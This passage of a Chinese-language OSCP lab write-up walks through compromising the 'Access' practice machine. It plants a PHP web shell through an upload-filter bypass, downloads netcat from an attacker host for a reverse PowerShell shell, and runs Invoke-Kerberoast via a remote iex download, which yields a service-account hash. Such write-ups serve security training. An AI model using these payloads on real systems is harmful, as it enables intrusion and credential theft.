+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/Ticket.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">192.168.167.187</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=---------------------------29739589853663594743950605566</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">782</span>
+</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://192.168.167.187</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://192.168.167.187/</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------------------29739589853663594743950605566
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;your-name&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">tst
+</span></span><span class="line"><span class="cl">-----------------------------29739589853663594743950605566
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;your-email&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">test@test.com
+</span></span><span class="line"><span class="cl">-----------------------------29739589853663594743950605566
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;ticket-type&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">standard-access
+</span></span><span class="line"><span class="cl">-----------------------------29739589853663594743950605566
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;the_file&#34;; filename=&#34;test.PHP::$DATA&#34;
+</span></span><span class="line"><span class="cl">Content-Type:  application/x-php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;?php echo 123; echo system($_REQUEST[&#39;cmd&#39;]);  ?&gt;
+</span></span><span class="line"><span class="cl">-----------------------------29739589853663594743950605566
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;submit&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Purchase
+</span></span><span class="line"><span class="cl">-----------------------------29739589853663594743950605566--</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在uploads目录下找到所上传的文件，命令执行成功</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Access<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ curl <span class="s2">&#34;http://192.168.167.187/uploads/test.PHP?cmd=whoami&#34;</span>           
+</span></span><span class="line"><span class="cl">123access<span class="se">\s</span>vc_apache
+</span></span><span class="line"><span class="cl">access<span class="se">\s</span>vc_apache </span></span></code></pre></td></tr></table>
+</div>
+</div><p>下载nc，并进行反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">cmd</span><span class="o">=</span>mkdir+C:<span class="se">\t</span>mp<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nv">cmd</span><span class="o">=</span>dir+C:<span class="se">\t</span>mp<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nv">cmd</span><span class="o">=</span>curl+http://192.168.45.169/nc64.exe+-o+C:<span class="se">\t</span>mp<span class="se">\n</span>c.exe
+</span></span><span class="line"><span class="cl"><span class="nv">cmd</span><span class="o">=</span>C:<span class="se">\t</span>mp<span class="se">\n</span>c.exe+192.168.45.169+443+-e+powershell</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Access<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">443</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.169<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.167.187<span class="o">]</span> <span class="m">50217</span>
+</span></span><span class="line"><span class="cl">Windows PowerShell 
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\u</span>ploads&gt; whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">access<span class="se">\s</span>vc_apache
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\u</span>ploads&gt; </span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="prive" class="heading-element"><span>PrivE</span>
+  <a href="#prive" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>上传工具</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; curl http://192.168.45.169/winPEASany.exe -o C:<span class="se">\t</span>mp<span class="se">\w</span>inPEASany.exe
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; dir
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; ./winPEASany.exe &gt; 1.txt</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="spn" class="heading-element"><span>SPN</span>
+  <a href="#spn" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在当前用户下没有local.txt文件，注意到还有另一个svc_mssql账户</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; dir C:<span class="se">\u</span>sers<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    Directory: C:<span class="se">\u</span>sers
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                -------------         ------ ----
+</span></span><span class="line"><span class="cl">d-----        5/28/2021   3:53 AM                Administrator
+</span></span><span class="line"><span class="cl">d-r---        5/28/2021   3:53 AM                Public
+</span></span><span class="line"><span class="cl">d-----         4/8/2022   2:39 AM                svc_apache
+</span></span><span class="line"><span class="cl">d-----         4/8/2022   2:40 AM                svc_mssql</span></span></code></pre></td></tr></table>
+</div>
+</div><p>搜集SPN，测试过程中发现kali自带的empire下的get-spn.ps1无法实现效果，于是从网上找了一个脚本，地址：https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Source / credit:</span>
+</span></span><span class="line"><span class="cl"><span class="c"># https://social.technet.microsoft.com/wiki/contents/articles/18996.active-directory-powershell-script-to-list-all-spns-used.aspx</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">cls
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="nv">$search</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">DirectoryServices</span><span class="p">.</span><span class="py">DirectorySearcher</span><span class="p">([</span><span class="no">ADSI</span><span class="p">]</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$search</span><span class="p">.</span><span class="k">filter</span> <span class="p">=</span> <span class="s2">&#34;(servicePrincipalName=*)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">## You can use this to filter for OU&#39;s:</span>
+</span></span><span class="line"><span class="cl"><span class="c">## $results = $search.Findall() | ?{ $_.path -like &#39;*OU=whatever,DC=whatever,DC=whatever*&#39; }</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$results</span> <span class="p">=</span> <span class="nv">$search</span><span class="p">.</span><span class="py">Findall</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span> <span class="nv">$result</span> <span class="k">in</span> <span class="nv">$results</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$userEntry</span> <span class="p">=</span> <span class="nv">$result</span><span class="p">.</span><span class="py">GetDirectoryEntry</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">Write-host</span> <span class="s2">&#34;Object Name = &#34;</span> <span class="nv">$userEntry</span><span class="p">.</span><span class="py">name</span> <span class="n">-backgroundcolor</span> <span class="s2">&#34;yellow&#34;</span> <span class="n">-foregroundcolor</span> <span class="s2">&#34;black&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">Write-host</span> <span class="s2">&#34;DN      =      &#34;</span>  <span class="nv">$userEntry</span><span class="p">.</span><span class="py">distinguishedName</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">Write-host</span> <span class="s2">&#34;Object Cat. = &#34;</span>  <span class="nv">$userEntry</span><span class="p">.</span><span class="py">objectCategory</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">Write-host</span> <span class="s2">&#34;servicePrincipalNames&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$i</span><span class="p">=</span><span class="mf">1</span>
+</span></span><span class="line"><span class="cl">	<span class="k">foreach</span><span class="p">(</span> <span class="nv">$SPN</span> <span class="k">in</span> <span class="nv">$userEntry</span><span class="p">.</span><span class="py">servicePrincipalName</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">Write-host</span> <span class="s2">&#34;SPN(&#34;</span> <span class="nv">$i</span> <span class="s2">&#34;)   =      &#34;</span> <span class="nv">$SPN</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$i</span><span class="p">+=</span><span class="mf">1</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">Write-host</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>svc_mssql的SPN为 MSSQLSvc/DC.access.offsec</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; iwr -uri http://192.168.45.169/Get-SPN.ps1 -o Get-SPN.ps1
+</span></span><span class="line"><span class="cl">iwr -uri http://192.168.45.169/Get-SPN.ps1 -o Get-SPN.ps1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; ./Get-SPN.ps1
+</span></span><span class="line"><span class="cl">./Get-SPN.ps1
+</span></span><span class="line"><span class="cl">Object <span class="nv">Name</span> <span class="o">=</span>  SERVER
+</span></span><span class="line"><span class="cl"><span class="nv">DN</span>      <span class="o">=</span>       <span class="nv">CN</span><span class="o">=</span>SERVER,OU<span class="o">=</span>Domain Controllers,DC<span class="o">=</span>access,DC<span class="o">=</span>offsec
+</span></span><span class="line"><span class="cl">Object Cat. <span class="o">=</span>  <span class="nv">CN</span><span class="o">=</span>Computer,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>access,DC<span class="o">=</span>offsec
+</span></span><span class="line"><span class="cl">servicePrincipalNames
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">1</span> <span class="o">)</span>   <span class="o">=</span>       Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/SERVER.access.offsec
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">2</span> <span class="o">)</span>   <span class="o">=</span>       ldap/SERVER.access.offsec/ForestDnsZones.access.offsec
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">3</span> <span class="o">)</span>   <span class="o">=</span>       ldap/SERVER.access.offsec/DomainDnsZones.access.offsec
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">4</span> <span class="o">)</span>   <span class="o">=</span>       DNS/SERVER.access.offsec
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">5</span> <span class="o">)</span>   <span class="o">=</span>       GC/SERVER.access.offsec/access.offsec
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">6</span> <span class="o">)</span>   <span class="o">=</span>       RestrictedKrbHost/SERVER.access.offsec
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">7</span> <span class="o">)</span>   <span class="o">=</span>       RestrictedKrbHost/SERVER
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">8</span> <span class="o">)</span>   <span class="o">=</span>       RPC/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">9</span> <span class="o">)</span>   <span class="o">=</span>       HOST/SERVER/ACCESS
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">10</span> <span class="o">)</span>   <span class="o">=</span>       HOST/SERVER.access.offsec/ACCESS
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">11</span> <span class="o">)</span>   <span class="o">=</span>       HOST/SERVER
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">12</span> <span class="o">)</span>   <span class="o">=</span>       HOST/SERVER.access.offsec
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">13</span> <span class="o">)</span>   <span class="o">=</span>       HOST/SERVER.access.offsec/access.offsec
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">14</span> <span class="o">)</span>   <span class="o">=</span>       E3514235-4B06-11D1-AB04-00C04FC2DCD2/20dae709-54fe-40ec-8c68-4475793b542a/access.offsec
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">15</span> <span class="o">)</span>   <span class="o">=</span>       ldap/SERVER/ACCESS
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">16</span> <span class="o">)</span>   <span class="o">=</span>       ldap/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">17</span> <span class="o">)</span>   <span class="o">=</span>       ldap/SERVER.access.offsec/ACCESS
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">18</span> <span class="o">)</span>   <span class="o">=</span>       ldap/SERVER
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">19</span> <span class="o">)</span>   <span class="o">=</span>       ldap/SERVER.access.offsec
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">20</span> <span class="o">)</span>   <span class="o">=</span>       ldap/SERVER.access.offsec/access.offsec
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Object <span class="nv">Name</span> <span class="o">=</span>  krbtgt
+</span></span><span class="line"><span class="cl"><span class="nv">DN</span>      <span class="o">=</span>       <span class="nv">CN</span><span class="o">=</span>krbtgt,CN<span class="o">=</span>Users,DC<span class="o">=</span>access,DC<span class="o">=</span>offsec
+</span></span><span class="line"><span class="cl">Object Cat. <span class="o">=</span>  <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>access,DC<span class="o">=</span>offsec
+</span></span><span class="line"><span class="cl">servicePrincipalNames
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">1</span> <span class="o">)</span>   <span class="o">=</span>       kadmin/changepw
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Object <span class="nv">Name</span> <span class="o">=</span>  MSSQL
+</span></span><span class="line"><span class="cl"><span class="nv">DN</span>      <span class="o">=</span>       <span class="nv">CN</span><span class="o">=</span>MSSQL,CN<span class="o">=</span>Users,DC<span class="o">=</span>access,DC<span class="o">=</span>offsec
+</span></span><span class="line"><span class="cl">Object Cat. <span class="o">=</span>  <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>access,DC<span class="o">=</span>offsec
+</span></span><span class="line"><span class="cl">servicePrincipalNames
+</span></span><span class="line"><span class="cl">SPN<span class="o">(</span> <span class="m">1</span> <span class="o">)</span>   <span class="o">=</span>       MSSQLSvc/DC.access.offsec
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; </span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="ticket" class="heading-element"><span>Ticket</span>
+  <a href="#ticket" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>接下去获取<code>svc_mssql</code>的票据，使用如下命令将ticket存储在内存中：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; Add-Type -AssemblyName System.IdentityModel
+</span></span><span class="line"><span class="cl">Add-Type -AssemblyName System.IdentityModel
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="s1">&#39;MSSQLSvc/DC.access.offsec&#39;</span>
+</span></span><span class="line"><span class="cl">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="s1">&#39;MSSQLSvc/DC.access.offsec&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Id                   : uuid-b4d9ac78-ba0f-45f4-8020-5dec3d5e6101-1
+</span></span><span class="line"><span class="cl">SecurityKeys         : <span class="o">{</span>System.IdentityModel.Tokens.InMemorySymmetricSecurityKey<span class="o">}</span>
+</span></span><span class="line"><span class="cl">ValidFrom            : 1/11/2024 5:44:07 PM
+</span></span><span class="line"><span class="cl">ValidTo              : 1/12/2024 3:44:07 AM
+</span></span><span class="line"><span class="cl">ServicePrincipalName : MSSQLSvc/DC.access.offsec
+</span></span><span class="line"><span class="cl">SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用Empire 的 Invoke-Kerberoast.ps1 导出内存中的Kerberoast hash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; iex<span class="o">(</span>new-object net.webclient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">&#39;http://192.168.45.169/Invoke-Kerberoast.ps1&#39;</span><span class="o">)</span><span class="p">;</span> Invoke-Kerberoast -OutputFormat Hashcat
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">TicketByteHexStream  : 
+</span></span><span class="line"><span class="cl">Hash                 : <span class="nv">$krb5tgs$23$*</span>svc_mssql<span class="nv">$access</span>.offsec<span class="nv">$MSSQLSvc</span>/DC.access.offsec*<span class="nv">$600077</span>ADCF96E989D8C9A8D1AE325F08
+</span></span><span class="line"><span class="cl"><span class="nv">$A0DA4C8A4C76EB098A4567BBCA91C9883EAA1F35C75428CEE9F738D9044A5F0F41153B51832DA55E14097C267EA14BF</span>
+</span></span><span class="line"><span class="cl">88A9861E14500A2E1E3D8E95269FD34FEA33A40EFF9658E40C8DADFDD868D17A49BDCD72575BBF060267B0F4F7617BFF
